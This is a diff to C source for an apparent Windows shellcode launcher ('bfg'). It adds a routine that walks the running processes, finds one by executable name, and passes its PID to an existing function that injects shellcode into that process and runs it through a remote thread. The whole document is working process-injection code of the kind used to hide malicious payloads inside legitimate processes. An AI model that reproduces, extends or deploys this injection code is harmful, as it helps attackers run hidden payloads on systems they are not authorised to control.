@@ -24,6 +24,9 @@ Web: https://github.com/govolution/bfg
 #include <windows.h>
 #include <tchar.h>
 #include "defs.h"
+#ifdef IMAGE
+#include <psapi.h>
+#endif
 
 int get_filesize(char *fvalue);
 unsigned char* load_file(char *fvalue, unsigned char *buf, int size2);
@@ -31,6 +34,9 @@ void exec_shellcode(unsigned char *shellcode);
 void exec_shellcode64(unsigned char *shellcode);
 #ifdef INJECT_SHELLCODE
 DWORD inject_sc_process(unsigned char *shellcode, DWORD pid);
+#endif
+#ifdef IMAGE
+DWORD get_pid_by_name(char *imgname);
 #endif
 
 int main (int argc, char **argv)
@@ -40,7 +46,6 @@ int main (int argc, char **argv)
 	#endif
 		
 	char *fvalue = NULL;
-	//char *uvalue = NULL;
 
 	int index;
 	int c;
@@ -104,6 +109,7 @@ int main (int argc, char **argv)
 	#endif
 	
 	#ifdef INJECT_SHELLCODE
+	#ifndef IMAGE
 		int tmp;
 		#ifndef LVALUE
 			tmp=atoi(argv[1]);
@@ -112,6 +118,18 @@ int main (int argc, char **argv)
 			tmp=atoi(argv[2]);
 		#endif
 		inject_sc_process(shellcode, tmp);
+	#endif
+	#endif
+	
+	#ifdef IMAGE
+	#ifdef INJECT_SHELLCODE
+		printf("Imagename to search: %s\n", IMAGE); 
+		int tmp=get_pid_by_name(IMAGE);
+		#ifdef PRINT_DEBUG
+			printf("PID %d\n", tmp);
+		#endif
+		inject_sc_process(shellcode, tmp);	
+	#endif
 	#endif
 	}
 
@@ -214,7 +232,6 @@ void exec_shellcode64(unsigned char *shellcode)
 DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
 {
 	PBYTE pShellcode = shellcode;
-	//SIZE_T szShellcodeLength=272;
 	SIZE_T szShellcodeLength = strlen(shellcode);
 	HANDLE hProc;
 	HANDLE hRemoteThread;
@@ -244,6 +261,58 @@ DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
 	CloseHandle(hProc);
 
 	return 0;	
+}
+#endif
+
+#ifdef IMAGE
+DWORD get_pid_by_name(char *imgname)
+{
+	DWORD aProcesses[1024], cbNeeded, cProcesses;
+	unsigned int i;
+
+	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
+	{
+		return -1;
+	}
+
+	cProcesses = cbNeeded / sizeof(DWORD);
+
+	for ( i = 0; i < cProcesses; i++ )
+	{
+		if( aProcesses[i] != 0 )
+		{
+			DWORD processID = aProcesses[i];
+			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+
+			HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
+					PROCESS_VM_READ,
+					FALSE, processID );
+
+			if (NULL != hProcess )
+			{
+				HMODULE hMod;
+				DWORD cbNeeded;
+
+				if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), 
+							&cbNeeded) )
+				{
+					GetModuleBaseName( hProcess, hMod, szProcessName, 
+							sizeof(szProcessName)/sizeof(TCHAR) );
+				}
+			}
+
+
+			if (strcmp(szProcessName,IMAGE) == 0)
+			{
+				CloseHandle( hProcess );
+				return processID;
+			}
+
+			CloseHandle( hProcess );
+		}
+	}
+
+	return -2;
 }
 #endif
 
